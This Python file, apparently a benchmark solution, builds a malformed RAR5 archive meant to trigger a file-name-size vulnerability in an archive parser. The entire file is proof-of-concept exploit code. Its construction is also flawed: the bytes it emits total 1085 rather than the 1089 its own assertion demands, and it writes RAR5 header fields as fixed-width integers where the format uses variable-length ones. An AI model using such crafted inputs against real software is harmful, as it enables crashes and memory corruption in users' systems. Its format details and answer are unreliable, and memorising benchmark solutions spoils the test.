import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 signature
        poc = bytearray()
        poc.extend(b'Rar!\x1a\x07\x01\x00')
        
        # Archive header
        poc.extend(struct.pack('<I', 0))  # CRC32
        poc.append(0x03)  # Header type: Archive
        poc.extend(struct.pack('<H', 0))  # Header flags
        poc.extend(struct.pack('<H', 13))  # Header size
        
        # Archive header data
        poc.extend(struct.pack('<I', 0))  # Flags
        
        # File header - This will trigger the vulnerability
        # We'll set a very large name size that exceeds allowed limit
        poc.extend(struct.pack('<I', 0))  # CRC32
        poc.append(0x05)  # Header type: File
        poc.extend(struct.pack('<H', 0))  # Header flags
        poc.extend(struct.pack('<H', 0xffff))  # Header size = 0xffff
        poc.extend(struct.pack('<H', 1044))  # Extra size
        
        # File header data
        poc.extend(struct.pack('<I', 0))  # Attributes
        poc.extend(struct.pack('<I', 0))  # Modification time
        poc.extend(bytes([0]))  # Data size VINT (0)
        
        # Name size VINT - This is the critical part
        # We encode 0x80000001 (2147483649) which is way above typical limits
        # Using 5-byte VINT encoding for large value
        poc.extend(b'\x81\x80\x80\x80\x08')
        
        # Actual name (much shorter than the declared size)
        poc.extend(b'vuln.txt')
        
        # Fill the rest of the header to reach exact size
        remaining = 1044 - (5 + 8)  # Subtract VINT size and actual name size
        poc.extend(b'A' * remaining)
        
        # Make sure total length matches ground truth
        assert len(poc) == 1089, f"Expected 1089 bytes, got {len(poc)}"
        
        return bytes(poc)